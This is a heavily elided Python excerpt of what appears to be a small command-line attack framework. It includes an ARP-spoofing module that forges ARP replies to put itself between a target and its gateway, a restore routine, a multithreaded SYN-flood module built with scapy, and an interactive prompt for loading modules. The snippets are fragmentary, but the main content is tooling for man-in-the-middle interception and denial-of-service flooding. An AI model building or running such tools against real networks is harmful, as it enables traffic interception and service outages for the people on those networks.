...
class Exploit(object):
    ...
    def base(self) -> bool:
        ...
        try:
            ...
            logging.error(
                f"Insufficient permissions, run with sudo ./{sys.argv[0]}")
            return False
...
class ARPSpoof(Exploit):
    ...
    def exploit(self):
        ...
        target_arp_pkt = ARP(op=2, psrc=self.gateway_ip,
                             pdst=self.target_ip, hwdst=self.own_mac)
        gateway_arp_pkt = ARP(op=2, psrc=self.target_ip,
    ...
    def restore(self):
        ...
        target_arp_pkt = ARP(op=2, psrc=self.gateway_ip,
                             pdst=self.target_ip, hwdst=self.gateway_mac)
        gateway_arp_pkt = ARP(op=2, psrc=self.target_ip,
                              pdst=self.gateway_ip, hwdst=self.target_mac)
    ...
    def exploit(self):
        ...
        for thread in range(self.num_threads):
            new_thread = threading.Thread(
                target=self.exploit_thread, args=(thread,))
...
class SYNFlood(Exploit):
    ...
    def exploit_thread(self, thread_id: int):
        ...
        '''
        logging.info(f"Thread {thread_id} starting!")
        flood_pkt = IP(dst=self.target_ip) / \
...
class WayyangPrompt(object):
    ...
    def module_spooler(self, chosen_exploit: Exploit):
        ...
        while self.module_loop and self.main_loop:
            try:
                self.parse_module_commands(
                    input(self.generate_prompt_string()))
            except KeyboardInterrupt:
                self.main_loop = False
